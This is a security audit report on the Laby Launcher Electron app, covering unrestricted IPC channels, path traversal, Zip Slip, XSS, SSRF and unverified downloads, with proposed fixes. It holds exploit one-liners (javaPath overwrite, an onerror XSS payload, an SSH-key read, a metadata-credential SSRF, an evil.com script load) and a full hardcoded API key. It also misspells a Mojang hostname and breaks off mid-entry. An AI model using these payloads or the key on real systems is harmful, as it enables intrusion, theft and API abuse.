# Security Audit Report — Laby Launcher 3.0.11

> **Target:** Laby Launcher 3.0.11 (Electron 29.4.3, AppImage 3.0.11)
> **Scope:** Full static security audit of the production bundle
>   - Main process: `resources/app/.webpack/main/index.js` (18 MB minified, 100 335 lines after pretty-print)
>   - Renderer process: `resources/app/.webpack/renderer/main_window/index.js` (17 MB minified, 123 853 lines after pretty-print)
>   - Preload: `resources/app/.webpack/renderer/main_window/preload.js` (8 KB)
>   - All 255 IPC channels covered
>   - All HTTP endpoints / server-side integrations covered
> **Method:** Static analysis with grep-based pattern matching against the de-minified bundle
> **Date:** July 2026

---

## Executive Summary

A total of **26 vulnerabilities** were identified. The four most critical issues allow **Remote Code Execution (RCE)** through any Cross-Site Scripting (XSS) vector in the renderer process. The root architectural weakness is that the **renderer process is fully trusted by the main process**: the preload script exposes the raw `ipcRenderer` API without a channel whitelist, and the main process performs no input validation on IPC arguments. On top of that, every server-side integration (LabyMod releases, Modrinth, CurseForge, Mojang, Microsoft) lacks signature verification on downloaded artifacts, leaving the supply chain exposed.

**Any XSS in the renderer equals immediate RCE.** Supply-chain attacks (e.g. compromising a CDN or MITM during a TLS failure) can drop a malicious binary on the user's machine without ever exploiting the renderer.

### Severity Breakdown

| Severity | Count |
|----------|-------|
| Critical | 14    |
| High     | 7     |
| Medium   | 5     |
| **Total**| **26**|

### Attack Chain Summary (3-step RCE)

1. Attacker triggers XSS (via **Vuln #14** — inline HTML in news articles, or any other vector).
2. XSS payload executes: `window.ipc.invoke('config:set', 'javaPath', 'C:\\Users\\Public\\evil.exe')` (**Vuln #9**).
3. User clicks "Play" → `child_process.spawn('C:\\Users\\Public\\evil.exe', ...)` → **RCE**.

Alternative RCE paths:
- **Vuln #2, #3, #4** — write to startup folder / launch `.exe` directly via `shell.openExternal` / `shell.openPath`.
- **Vuln #13** — Zip Slip via malicious `.mrpack` modpack.
- **Vuln #24** — Modrinth install without hash verification (supply chain).

---

## IPC Channel Audit — All 255 Channels

The launcher exposes **255 IPC channels** between the renderer and the main process. The preload script (Vuln #1) provides unrestricted access to all of them. The table below summarizes the audit findings per channel group.

### Channel Categories

| Category | Channels | Risk Profile |
|----------|----------|--------------|
| Window management | 6 | Low — only window operations |
| Misc (open-url, open-folder, devtools) | 8 | **Critical** — see Vuln #2, #3 |
| Authentication | 5 | Medium — see Vuln #21 |
| Loading / Toast / Popup | 9 | Low — UI-only |
| Settings (config:*) | 18 | **Critical** — see Vuln #9 |
| Launcher (laby:*) | 35 | Medium — see Vuln #21, #22 |
| Launcher update | 2 | Medium — see Vuln #11 (auto-update) |
| Language / Friends / News / Ideas | 18 | Low — mostly read-only |
| Changelog / Layout / Setup / Theme / TOS | 12 | Low |
| Minecraft (mc:*) | 6 | **High** — see Vuln #21 (mc:block-icon-cache-*) |
| Mojang (mojang:*) | 4 | Low — uses `dialog.showOpenDialog` for file picks |
| Textures (texture:*, laby:texture-*) | 6 | Low |
| Instances (instances:*) | 89 | **Critical** — see Vuln #4–#11 |
| Meta (meta:*) | 4 | Low — read-only |
| Addons (addons:*) | 9 | Low |
| Image cache (image-cache:*) | 2 | **Critical** — see Vuln #21 (SSRF) |
| Debug (debug:*) | 4 | Low — DNS resolve / traceroute to fixed domains |
| Support / Profiling | 7 | **Critical** — see Vuln #3, #17 |
| Profile (laby:userdata-*) | 2 | Low |
| Modloader update | 1 | Medium — see Vuln #24 |

### Critical IPC Channels Requiring Immediate Fix

The following channels accept attacker-controlled arguments and pass them to dangerous sinks without validation. Full details are in the vulnerability list below.

| Channel | Sink | Vulnerability |
|---------|------|---------------|
| `open-url` | `shell.openExternal(url)` | #2 |
| `support:open-folder` | `shell.openPath(folderPath)` | #3 |
| `instances:apply-custom-icon-from-path` | `fs.copyFile(sourcePath, destPath)` | #4 |
| `instances:remove-resource` | `fs.rm(path, {recursive:true, force:true})` | #5 |
| `instances:read-screenshot` | `fsp.readFile(filePath)` | #6 |
| `instances:delete-screenshot` | `fsp.unlink(filePath)` | #7 |
| `instances:copy-screenshot` | `nativeImage.createFromPath(filePath)` | #8 |
| `config:set` | `config[key] = value` | #9 |
| `instances:update` | `Object.assign(instance, updates)` | #10 |
| `instances:create` | `createInstance({gameDirectory: opts.gameDirectory})` | #11 |
| `instances:open-content-dir` | `shell.openPath(dir)` (derived from instance config) | #12 |
| `instances:crash-upload-log` | `hastebin.uploadAndCopy(logTail)` | #17 |
| `instances:crash-report` | `web.postJson(URLS.report(), logTail)` | #17 |
| `image-cache:get-texture` | `WebRequest.ofArrayBuffer(url).execute()` | #21 (SSRF) |
| `mc:block-icon-cache-set` | `fs.writeFileSync(resolve(iconsDir, \`${key}.png\`), pngData)` | #21 (path traversal) |
| `mc:block-icon-cache-get` | `fs.readFileSync(resolve(iconsDir, \`${key}.png\`))` | #21 (path traversal) |

### Read-Only / Safe Channels

The remaining channels (approximately 200) are either:
- Pure UI state messages (e.g. `display-toast`, `start-loading`, `window:maximized-changed`)
- Read-only getters backed by instance lookups (e.g. `instances:get-all`, `instances:get-summary`)
- File pickers using `dialog.showOpenDialog` (e.g. `instances:pick-mod-files`, `instances:pick-mrpack`, `instances:pick-java`)
- Tightly scoped setters (e.g. `config:update-highlight-color` validates `color` is a string)

These channels do not pose a direct security risk. They are listed here for completeness.

---

## Server-Side / HTTP Endpoint Audit

The launcher makes outbound requests to the following endpoints. Findings are summarized below; full vulnerability entries follow in the next section.

### Endpoint Inventory

| Host | Purpose | Auth | TLS |
|------|---------|------|-----|
| `https://laby.net/api/v3/` | News, friends, ideas, changelog, skin renders, server ping | LabyRest JWT (bearer) | Yes |
| `https://laby.net/.well-known/mercure` | SSE hub for friend status / texture updates | LabyRest JWT (bearer) | Yes |
| `https://releases.labymod.net/api/v1/` | LabyMod manifests, libraries, assets | Signed URL token (RELEASER_BASE only) | Yes |
| `https://releases.r2.labymod.net/` | Cloudflare R2 mirror for the above | None | Yes |
| `https://laby-releases.s3.de.io.cloud.ovh.net/` | OVH S3 mirror for the above | None | Yes |
| `https://releases.r2.labymod.net/launcher/linux/${arch}/Laby%20Launcher-latest.AppImage` | Linux auto-update | **None** | Yes |
| `https://api.modrinth.com/v2/` | Modrinth mod/modpack metadata + downloads | None (public API) | Yes |
| `https://api.curseforge.com/v1/` | CurseForge mod metadata + downloads | **Hardcoded API key in client** | Yes |
| `https://edge.forgecdn.net/files/` | CurseForge CDN for mod binaries | None | Yes |
| `https://resources.download.minecraft.net/` | Mojang vanilla assets | None | Yes |
| `https://sessionserver.mojang.com/session/minecraft/` | Mojang session join | Mojang access token in body | Yes |
| `https://api.minecreaftservices.com/` | Mojang profile / skins / capes | Mojang access token in header | Yes |
| `https://login.live.com/oauth20_*` | Microsoft OAuth | PKCE (EC P-256) | Yes |
| `https://paste.labymod.net/documents` | Hastebin crash-log upload | None | Yes |
| `https://api.mclo.gs/1/log` | mclo.gs crash-log fallback | None | Yes |
| `https://pro.ip-api.com/json/?key=...` | Debug network-info tool | Hardcoded IP-API key | Yes |

### Server-Side Findings

| # | Severity | Finding |
|---|----------|---------|
| 21 | **Critical** | `image-cache:get-texture` is a **full SSRF** — renderer can pass arbitrary URL to the main process, which then performs the request. Bypasses CORS, can reach AWS metadata (`169.254.169.254`), internal services, `localhost`, etc. |
| 22 | **High** | JWTs from LabyMod are **decoded but never verified** (`jwt.decode`, no `jwt.verify`). If a TLS-failure MITM or server compromise feeds a forged token, the client trusts the token contents (UUID, role, expiry) without checking the signature. |
| 23 | **High** | **CurseForge API key hardcoded in client**: `$2a$10$ovhZip0zfjpEgB7p2z4TSuKh2861OLVcAeGaKRZlo5jWk6MjRTnu6` (line 44945). Any user can extract it from the AppImage and abuse the CurseForge API under LabyMod's quota. |
| 24 | **High** | **Modrinth `installVersion` does not verify file hashes** (`file.hashes.sha1`/`sha512` are present in the API response but never checked). Combined with the lack of `fileName` sanitization, this is both a supply-chain risk and a potential path traversal (filename `../../../evil.jar`). |
| 25 | **Medium** | **Linux auto-update downloads AppImage without signature/hash verification** (only HTTPS). If R2/Cloudflare is compromised or a malicious CA cert is issued, an attacker can ship a trojaned AppImage that auto-installs on the next restart. |
| 26 | **Medium** | **`loadAndCheck` skips checksum verification in dev mode** (`if (isDevMode()) resolve();`). While production builds verify, anyone running a dev build (e.g. a tester leaking a build) gets no integrity protection. Also, **MD5** is still used for R2-hosted assets — MD5 is cryptographically broken for collision resistance. |

### Specific Issues per Endpoint Group

#### LabyMod Releases (`releases.labymod.net`, `releases.r2.labymod.net`, OVH S3)
- The launcher distinguishes between authenticated and unauthenticated release channels via `needsAuth(releaseChannel)`. Only `RELEASER_BASE` (the labymod.net origin) requires auth; R2 and S3 are public mirrors. Authenticated requests use a signed URL token, not a static key.
- **Leftover dev endpoint** in source: `// "http://10.42.1.8:3002"` (line 76799). Not currently used, but should be removed to avoid accidental switch.
- Manifests are downloaded as JSON and parsed with `JSON.parse` — no schema validation, vulnerable to prototype pollution if a malicious manifest contains `__proto__` (compounds Vuln #19).
- **Release-channel `endpoint` is configurable per channel** and passed through `replaceBase()`. If a malicious release channel config can be planted (via `config:set` Vuln #9 or `instances:update` Vuln #10), the launcher will fetch manifests and assets from an arbitrary URL.

#### Modrinth (`api.modrinth.com`)
- `Modrinth.installVersion` downloads `.jar` files via `web.download(path, downloadUrl)`.
- The Modrinth API returns `file.hashes.sha1` and `file.hashes.sha512`, but the launcher **never verifies** them after download.
- `file.filename` is used directly in `path = filecontroller.resolve(directory, file.filename)`. A malicious Modrinth API response with `filename: "../../../startup/evil.jar"` triggers path traversal (compounds Vuln #12).
- Modrinth `.mrpack` import goes through `extractDirectoryFromZip` which is vulnerable to Zip Slip (Vuln #13).

#### CurseForge (`api.curseforge.com`, `edge.forgecdn.net`)
- The hardcoded `$2a$10$...` API key (Vuln #23) is sent as `x-api-key` header on every CurseForge request.
- `buildCdnUrl(file)` constructs `https://edge.forgecdn.net/files/${fileId}/${fileName}` from CurseForge file metadata. The `fileName` is taken verbatim from the API response — if CurseForge (or a MITM) returns a malicious filename, it can cause path traversal when saved to disk via `filecontroller.resolve`.
- No hash verification on downloaded CurseForge files.

#### Mojang (`sessionserver.mojang.com`, `api.minecreaftservices.com`)
- The `Yggdrasil.joinServer` flow sends `accessToken` in the POST body (not URL) — correct.
- Skin upload (`mojang:upload-skin-file`) uses `dialog.showOpenDialog` for file selection — safe.
- Mojang access tokens are redacted from crash logs (Vuln #18 covers the gaps).

#### Microsoft OAuth (`login.live.com`)
- Uses PKCE with EC P-256 key pair (no `client_secret`) — correct for desktop apps.
- `getClientId()` returns a public client UUID — not a secret.
- The OAuth redirect URI is hardcoded; auth code exchange happens via `OAuthResponse` with the EC private key as proof.

#### Hastebin / mclo.gs (`paste.labymod.net`, `api.mclo.gs`)
- Crash log uploads are unauthenticated (Vuln #17).
- The launcher writes the returned URL to the user's clipboard silently — surprising behavior that can be abused by an attacker to overwrite the clipboard with arbitrary content.

#### Mercure Hub (`laby.net/.well-known/mercure`)
- The hub URL is hardcoded — good.
- The JWT used as the bearer token for SSE is fetched from `https://laby.net/api/v3/auth?mercure_status=true` and refreshed on 401.
- The SSE messages are JSON-parsed and dispatched to renderer listeners. If a malicious server (after JWT forgery via Vuln #22) sends a crafted payload, the renderer processes it as trusted data. This can be chained with renderer XSS vectors.

---

## Vulnerability List

### Critical Vulnerabilities

#### Vuln #1 — Preload Exposes Raw `ipcRenderer` Without Channel Whitelist

**Location:** `resources/app/.webpack/renderer/main_window/preload.js`

```js
contextBridge.exposeInMainWorld('ipc', {
    invoke: (channel, ...args) => ipcRenderer.invoke(channel, ...args),
    send: (channel, ...args) => ipcRenderer.send(channel, ...args),
    on: (key, callback) => ipcRenderer.on(key, callback),   // event object leaks!
    removeAllListeners, removeListener, receive, log, clearCache
});
```

**Problem:** The renderer (or any XSS) can call **any of the 255 IPC channels** with any arguments. The `on` method additionally leaks the `event` object, partially breaking context isolation. This transforms any XSS into full RCE when combined with Vuln #2–#11.

**Fix:** Implement a strict whitelist in preload:
```js
const ALLOWED = new Set(['open-url', 'config:get', /* ... */]);
invoke: (channel, ...args) => {
    if (!ALLOWED.has(channel)) throw new Error('blocked channel: ' + channel);
    return ipcRenderer.invoke(channel, ...args);
}
```
Remove `on` (replace with `receive` that does not pass `event`).

---

#### Vuln #2 — `shell.openExternal(url)` Without Scheme Validation → RCE on Windows

**Location:** main `index.js`, lines 62691–62696 (IPC `open-url`) and 62553–62558 (`setWindowOpenHandler`)

```js
ipcMain.on(OPEN_URL, (event, url) => {
    try { yield shell.openExternal(url); }  // no validation
    catch (e) { log("Failed: ", e); }
});

mainWindow.webContents.setWindowOpenHandler(data => {
    if (data.url.startsWith(url)) log("Tried to open internal URL");
    else shell.openExternal(data.url);  // no validation
    return { action: "deny" };
});
```

**Exploit (Windows):** Any XSS → `ipc.invoke('open-url', 'file:///C:/Windows/System32/calc.exe')` or `search-ms:`, `ms-officecmd:` → **arbitrary executable launch**.

**Fix:** Whitelist `http:` and `https:` only.

---

#### Vuln #3 — `support:open-folder` → `shell.openPath(arbitraryPath)` → RCE

**Location:** main `index.js`, line 62827

```js
ipcMain.handle(SUPPORT_OPEN_FOLDER, (_event, folderPath) => {
    yield shell.openPath(folderPath);  // fully attacker-controlled
});
```

**Exploit (Windows):** `ipc.invoke('support:open-folder', 'C:\\evil\\malware.exe')` → launches `.exe`/`.bat`/`.cmd` via the system handler.

**Fix:** Validate that the path is a directory inside the game directory; never pass files with executable extensions to `openPath`.

---

#### Vuln #4 — `instances:apply-custom-icon-from-path` → Path Traversal + Arbitrary File Copy

**Location:** main `index.js`, lines 95283–95292

```js
handle(INSTANCES_APPLY_CUSTOM_ICON_FROM_PATH, (id, sourcePath) => {
    const destPath = filecontroller.resolve(cacheDir, `${id}.png`);
    yield fs.copyFile(sourcePath, destPath);  // both sourcePath and id are attacker-controlled
});
```

`FileController.resolve()` is simple string concatenation without `..` protection (Vuln #12).

**Exploit:** Read any file (`sourcePath='C:\\Windows\\win.ini'`) or write `.png` to the Windows startup folder (`id='../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/evil'`).

**Fix:** Use `path.resolve()` + `startsWith(allowedRoot)` validation. Enforce `id` as a UUID.

---

#### Vuln #5 — `instances:remove-resource` → Arbitrary File Deletion

**Location:** main `index.js`, lines 95639–95640 (implementation 66582–66592)

```js
ipcMain.handle(INSTANCES_REMOVE_RESOURCE, (filePath) => removeResource(filePath));

function removeResource(filePath) {
    if (yield filecontroller.exists(filePath))
        yield filecontroller.delete(filePath);  // fs.rm(path, {recursive:true, force:true})
}
```

**Exploit:** `ipc.invoke('instances:remove-resource', 'C:\\Users\\victim\\Documents\\important')` deletes any file/directory accessible to the user.

**Fix:** Verify that `filePath` is inside the instance's game directory.

---

#### Vuln #6 — `instances:read-screenshot` → Arbitrary File Read

**Location:** main `index.js`, line 95713 (implementation 67135–67151)

```js
ipcMain.handle(INSTANCES_READ_SCREENSHOT, (filePath) => readScreenshot(filePath));

function readScreenshot(filePath) {
    const data = yield fsp.readFile(filePath);   // no validation
    return `data:${mime};base64,${data.toString("base64")}`;
}
```

**Exploit:** `ipc.invoke('instances:read-screenshot', 'C:\\Users\\victim\\.ssh\\id_rsa')` returns the contents of any file as a base64 data URL.

**Fix:** Validate `filePath` is inside the instance's `screenshots` directory.

---

#### Vuln #7 — `instances:delete-screenshot` → Arbitrary File Deletion

**Location:** main `index.js`, line 95716 (implementation 67152–67163)

Duplicates Vuln #5 through a different IPC channel.

---

#### Vuln #8 — `instances:copy-screenshot` → File Read into Clipboard (Exfiltration)

**Location:** main `index.js`, line 95719 (implementation 67164–67175)

```js
function copyScreenshotToClipboard(filePath) {
    const img = nativeImage.createFromPath(filePath);   // reads any file
    clipboard.writeImage(img);                          // places in clipboard
}
```

**Fix:** Validate `filePath` is inside the `screenshots` directory.

---

#### Vuln #9 — `config:set` → Persisting RCE via `javaPath` Overwrite

**Location:** main `index.js`, lines 64753–64758

```js
ipcMain.handle(CONFIG_SET, (key, value) => {
    config[key] = value;   // both key and value are fully attacker-controlled
    yield configController.save();
});
```

Minecraft is later launched via `child_process.spawn(javaPath, args, ...)` (line 79388). An attacker sets `javaPath = 'C:\\malware.exe'` → next "Play" click executes the malicious binary. This is **persisting RCE** — survives application restart.

**Exploit:**
```js
await ipc.invoke('config:set', 'javaPath', 'C:\\Users\\Public\\evil.exe');
```

**Fix:** Whitelist config fields; forbid changes to `javaPath`, `gameDirectory`, `selectedReleaseChannel` via `config:set`.

---

#### Vuln #10 — `instances:update` Overwrites Any Instance Field Without Whitelist

**Location:** main `index.js`, line 95245 (implementation 1562–1571)

```js
ipcMain.handle(INSTANCES_UPDATE, (id, updates) => instancestore.updateInstance(id, updates));

updateInstance(id, updates) {
    Object.assign(instance, updates);  // no field whitelist
}
```

**Exploits:**
- `customJavaPath = 'C:\\malware.exe'` → spawn malware on launch
- `jvmArguments = '-Xbootclasspath/a:C:\\evil.jar'` → load arbitrary Java code
- `gameDirectory = 'C:\\Windows\\Temp\\evil'` → interact with arbitrary directory via `instances:open-content-dir`, `instances:copy-mod-configs`

**Fix:** Whitelist allowed update fields per instance type.

---

#### Vuln #11 — `instances:create` Accepts Arbitrary `gameDirectory`

**Location:** main `index.js`, line 95226

```js
handle(INSTANCES_CREATE, (opts) => {
    const instance = yield instancestore.createInstance({
        gameDirectory: opts.gameDirectory,  // path controlled by renderer
        jvmArguments: opts.jvmArguments,
        // ...
    });
});
```

Allows creating an instance with `gameDirectory` anywhere on the filesystem, then interacting with it via `instances:open-content-dir` (which calls `shell.openPath`).

**Fix:** Either ignore `opts.gameDirectory` and always use a path inside the launcher's working directory, or validate that the provided path is inside an allowed parent directory.

---

#### Vuln #12 — `FileController.resolve()` and `delete()` Lack Path Traversal Protection

**Location:** main `index.js`, lines 53322–53368

```js
class FileController {
    resolve(mainPath, ...paths) {
        let completePath = mainPath;
        paths.forEach(p => { completePath += spliterator + p; });
        return completePath;  // just a string, no .. check
    }
    delete(path) {
        fs.rm(path, { recursive, force: true, maxRetries: 5 });  // any path
    }
}
```

This means **every IPC handler that accepts a path from the renderer and passes it to `FileController` is vulnerable to path traversal**. Affected: `support:open-folder`, `instances:remove-resource`, `instances:apply-custom-icon-from-path`, `instances:add-mod-files`, `instances:add-resource-files`, `instances:open-content-dir`, all screenshot handlers, `mc:block-icon-cache-*`, Modrinth/CurseForge download paths.

**Fix:**
- `resolve()` must use `path.resolve()` and verify the result is inside `mainPath`.
- `delete()` must validate paths via a centralized `assertInside(baseDir, path)`.
- Add unit tests for `..`, symbolic links, `file:///`, and UNC paths (`\\?\C:\`).

---

#### Vuln #13 — `extractDirectoryFromZip` → Zip Slip

**Location:** main `index.js`, lines 53584–53608

```js
extractDirectoryFromZip(zipPath, destination, directory) {
    const zip = new AdmZip(zipPath);
    const zipEntries = zip.getEntries();
    for (const zipEntry of zipEntries) {
        const entryPath = zipEntry.entryName;
        if (!entryPath.startsWith(directory)) continue;
        const entryPathWithoutDirectory = entryPath.substring(directory.length);
        const outputPath = this.resolve(destination, entryPathWithoutDirectory);  // string concat
        fs.writeFileSync(outputPath, entryData);  // writes anywhere
    }
}
```

**Affected call sites:**
- `installModpackFiles` (line 22173) — `.mrpack` (Modrinth modpack) import
- `applyModUpdate` (line 353) — mod updates
- `importLunarConfig` (lines 25904, 25907) — Lunar Client config import

**Exploit:** Attacker uploads a malicious `.mrpack` with entry `overrides/../../../evil.exe`. Extraction writes `evil.exe` to `C:\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.exe` → executes at next login.

**Fix:**
```js
const outputPath = path.resolve(destination, entryPathWithoutDirectory);
const normalizedDest = path.resolve(destination);
if (!outputPath.startsWith(normalizedDest + path.sep)) {
    throw new Error(`Zip Slip detected: ${entryPath}`);
}
```

---

#### Vuln #14 — ArticleReader Renders News with Inline HTML Without Sanitization

**Location:** renderer `index.js`, module `ArticleReader.tsx`, lines 71307–71352

```js
const markdownOptions = {
    overrides: { /* ... */ },
    // NO disableParsingRawHTML: true
};

<Markdown options={markdownOptions}>
    {preprocessContent(article.content ?? "")}  // data from laby.net API
</Markdown>
```

`markdown-to-jsx` renders inline HTML by default. The data source is `article.content` from `laby.net/api/v3/.../news`. The application contains **no DOMPurify or any HTML sanitizer** (search across the entire renderer bundle returns 0 matches).

**Exploit:** Attacker injects into article content:
```html
<img src=x onerror="window.ipc.invoke('config:set','javaPath','C:\\evil.exe')">
```
When any user opens the article, the XSS executes → RCE via Vuln #9. No user interaction beyond opening the article is required.

Note: `changelog` (line 69056) and `info-messages` (line 50110) correctly set `disableParsingRawHTML: true`. Only `ArticleReader` missed it.

**Fix:**
```js
const markdownOptions = {
    disableParsingRawHTML: true,
    overrides: { /* ... */ },
};
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(article.content ?? "", { USE_PROFILES: { html: false } });
<Markdown options={markdownOptions}>{preprocessContent(clean)}</Markdown>
```

---

#### Vuln #15 — `openExternal` in Renderer Passes `javascript:` and `file:` URLs

**Location:** renderer `index.js`, `ArticleReader.tsx`, line 71274

```js
const openExternal = (url) => window.ipc.send(IPC_MESSAGES.OPEN_URL, url);  // no validation
```

The markdown `<a>` override passes `props.href` directly. React 18 warns about `javascript:` URLs but does not block them.

**Exploit:** Markdown payload `[click](file:///C:/evil.exe)` in a news article → user clicks → main process calls `shell.openExternal("file:///C:/evil.exe")` → file launch.

**Fix:** Validate URL scheme in renderer before sending (defense-in-depth; main-side fix Vuln #2 is also mandatory).

---

#### Vuln #16 — No CSP + No `will-navigate` Handler

**Location:** `index.html` and main `index.js`

- No `<meta http-equiv="Content-Security-Policy">` in `index.html`.
- The webRequest handler in main only modifies CORS but does not add a CSP header.
- No `webContents.on('will-navigate', e => e.preventDefault())` handler.

This means **any XSS found in the renderer → immediate RCE** through the chain with Vuln #1–#11. Without CSP, even `<script src="https://evil.com/payload.js">` succeeds.

**Fix:**

1. Add CSP via webRequest or meta tag:
```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self';
               script-src 'self';
               connect-src 'self' https://*.labymod.net https://*.laby.net https://api.minecreaftservices.com https://login.live.com https://*.xboxlive.com https://api.modrinth.com https://api.curseforge.com;
               img-src 'self' data: https:;
               style-src 'self' 'unsafe-inline';">
```

2. Add the navigation handler:
```js
mainWindow.webContents.on('will-navigate', (e) => e.preventDefault());
```

---

#### Vuln #17 — `instances:crash-upload-log` / `instances:crash-report` Send Arbitrary Data Without Auth/Rate-Limit

**Location:** main `index.js`, lines 95353–95378

```js
ipcMain.handle(INSTANCES_CRASH_UPLOAD_LOG, (logTail) => {
    yield hastebin.uploadAndCopy(logTail ?? "");  // arbitrary text from renderer
});

ipcMain.handle(INSTANCES_CRASH_REPORT, (logTail) => {
    yield web.postJson(URLS.report(), logTail ?? "", {  // no auth
        headers: { "X-Report-Type": "crash-report" }
    });
});
```

`Hastebin` uploads to `https://paste.labymod.net/documents` (fallback: `https://api.mclo.gs/1/log`) and **copies the URL to the user's clipboard without warning**.

**Exploits:**
- Any XSS → `ipc.invoke('instances:crash-upload-log', JSON.stringify(localStorage))` → data exfiltrated to `paste.labymod.net`, URL in clipboard.
- No rate limit → abuse the LabyMod server (DoS, spam).

**Fix:**
1. Accept only pre-formed crash payload objects (known schema), not arbitrary strings.
2. Rate limit: max N uploads per account per hour.
3. Show a consent dialog before uploading data to external services.
4. Do not overwrite the clipboard without explicit user consent.

---

#### Vuln #18 — `sanitize()` in CrashTracker Does Not Cover All Secrets

**Location:** main `index.js`, lines 28385–28396

```js
function sanitize(text, ctx) {
    let result = replaceUserName(text);
    try {
        if (ctx.accessToken)
            result = result.replace(new RegExp(escapeChars(ctx.accessToken), "gm"), "{session_id}");
        if (ctx.user) {
            result = result
                .replace(new RegExp(ctx.user.uuid, "gm"), "{unique_id}")
                .replace(new RegExp(ctx.user.uuid.replace(/-/g, ""), "gm"), "{unique_id}")
                .replace(new RegExp(escapeChars(ctx.user.username), "gm"), "{user_name}");
        }
    } catch (_) {}
    return result;
}
```

**Covered:** current account's Minecraft accessToken, UUID, username.

**Not covered:**
- Microsoft refresh tokens (stored in `launcher-tokens.json`, may appear in stack traces during auth flow errors)
- LabyRest JWT tokens (may appear in network request logs)
- Mojang access tokens for other logged-in accounts
- Old tokens from previous sessions
- Discord RPC token
- Server IPs (privacy concern)

**Additional issue:** If `accessToken` is empty or very short (e.g., `"a"`), the regex matches every `a` in the log → floods the log with `{session_id}`. Minimum length should be enforced (≥ 20 chars).

**Fix:** Extend the secret set to include all account tokens, LabyRest/mercury tokens, and add regex-based filters for JWT (`/eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g`).

---

#### Vuln #19 — `deepMerge()` Vulnerable to Prototype Pollution via `__proto__`/`constructor`

**Location:** main `index.js`, lines 21377–21385

```js
function deepMerge(target, source) {
    for (const key of Object.keys(source)) {  // does NOT filter __proto__/constructor
        // ...
        target[key] = src;
    }
}
```

`JSON.parse('{"__proto__":{"polluted":true}}')` creates an own enumerable `__proto__` property, which passes through `Object.keys()` and reaches `target[key] = src`. Used in the Lunar config importer (lines 77396, 77435). The source is user-imported Lunar Client config from external sources.

**Fix:**
```js
for (const key of Object.keys(source)) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') continue;
    // ... rest unchanged
}
```

---

#### Vuln #20 — `labytex://` Protocol Handler Allows Requests to Arbitrary URLs + `bypassCSP: true`

**Location:** main `index.js`, lines 33581–33655 (handler) and 62410–62412 (registration)

```js
protocol.registerSchemesAsPrivileged([{
    scheme: "labytex",
    privileges: { /* ... */ bypassCSP: true, /* ... */ }
}]);

// handler: labytex://news-image/{base64} → ensureNewsImageCached(originalUrl)
// ensureNewsImageCached fetches: https://laby.net/_next/image?url={originalUrl}
```

The renderer can force the main process to make HTTP requests to arbitrary URLs via `labytex://news-image/{base64-of-arbitrary-url}`. Although requests are routed through the laby.net image proxy (reducing direct SSRF risk to internal networks), this is still a **domain SSRF via a third-party proxy**.

Additionally, `bypassCSP: true` means an attacker who can control a `labytex://` URL bypasses CSP (compounds Vuln #16).

**Fix:** Remove `bypassCSP: true` if possible; validate `originalUrl` against an allowlist of expected hosts/paths in `handleProtocolRequest`.

---

#### Vuln #21 — `image-cache:get-texture` is a Full SSRF + `mc:block-icon-cache-*` Path Traversal

**Location (SSRF):** main `index.js`, lines 77309–77315

```js
ipcMain.handle(IMAGE_CACHE_GET_TEXTURE, (url) => {
    return yield getOrCacheTexture(url);  // arbitrary URL from renderer
});

function getOrCacheTexture(url) {
    const data = await WebRequest.ofArrayBuffer(url).execute();  // main process fetches ANY URL
    // ...
}
```

**Exploit (SSRF):** `ipc.invoke('image-cache:get-texture', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/')` → launcher fetches AWS metadata (or any internal service reachable from the user's machine) and returns it to the renderer as a data URL. This bypasses browser CORS restrictions because the request happens in the main process.

**Location (path traversal):** main `index.js`, lines 52441–52455

```js
ipcMain.handle(MC_BLOCK_ICON_CACHE_GET, (key) => {
    const filePath = filecontroller.resolve(iconsDir, `${key}.png`);  // key is attacker-controlled
    return fs.readFileSync(filePath);  // reads any .png file
});

ipcMain.handle(MC_BLOCK_ICON_CACHE_SET, (key, pngData) => {
    const filePath = filecontroller.resolve(iconsDir, `${key}.png`);
    fs.writeFileSync(filePath, pngData);  // writes any .png file
});
```

**Exploit (path traversal):** `ipc.invoke('mc:block-icon-cache-set', '../../../evil', maliciousPng)` writes `evil.png` outside the icons directory.

**Fix:**
- For SSRF: validate `url` against an allowlist of expected hosts (`texture.laby.net`, `textures.minecraft.net`, `cdn.modrinth.com`, etc.).
- For path traversal: validate `key` matches a strict pattern (e.g. `/^[a-z0-9_-]+$/i`) before using it in path construction.

---

#### Vuln #22 — LabyRest JWTs Are Decoded but Never Verified

**Location:** main `index.js`, lines 71829–71838

```js
class JWTUtil {
    decode(token) { return jwt.decode(token); }
    isExpired(token) {
        if (typeof token === 'string') token = jwt.decode(token);
        return !token?.exp || token.exp < Date.now() / 1000;
    }
}
```

Only `jwt.decode` is used throughout the codebase; `jwt.verify` is never called. The launcher trusts the JWT payload (UUID, role, expiry) without checking the signature.

**Exploit:** If a MITM attacker (e.g. via a TLS-failure scenario) or a compromised laby.net server feeds a forged JWT, the launcher accepts the token's claims (such as `is_staff: true` or an arbitrary UUID) without verifying the signature. This can unlock staff-only functionality, impersonate other users in friend lists, or bypass expiry checks.

**Fix:** Verify the JWT signature against the server's public key before trusting any claim. The public key can be pinned in the client or fetched once from a trusted endpoint.

---

#### Vuln #23 — CurseForge API Key Hardcoded in Client

**Location:** main `index.js`, line 44945

```js
exports.CURSEFORGE_API_KEY = "$2a$10$ovhZip0zfjpEgB7p2z4TSuKh2861OLVcAeGaKRZlo5jWk6MjRTnu6";
```

The key is sent as `x-api-key` header on every CurseForge API request (line 58601).

**Exploit:** Any user can extract the key from the AppImage and abuse the CurseForge API under LabyMod's quota. CurseForge may rate-limit or revoke the key, breaking the launcher for all users.

**Fix:** Proxy CurseForge API requests through a LabyMod backend that injects the key server-side. The client should never see the CurseForge key.

---

#### Vuln #24 — Modrinth `installVersion` Does Not Verify File Hashes

**Location:** main `index.js`, lines 25973–25986

```js
static installVersion(version, directory, isInstalled) {
    const file = version.files.find(f => f.primary) ?? version.files[0];
    const downloadUrl = file.url;
    const path = filecontroller.resolve(directory, file.filename);  // filename not sanitized
    yield web.download(path, downloadUrl);
    // NO hash verification despite file.hashes.sha1 / file.hashes.sha512 being available
}
```

The Modrinth API returns `file.hashes.sha1` and `file.hashes.sha512`, but the launcher never verifies them after download.

**Exploits:**
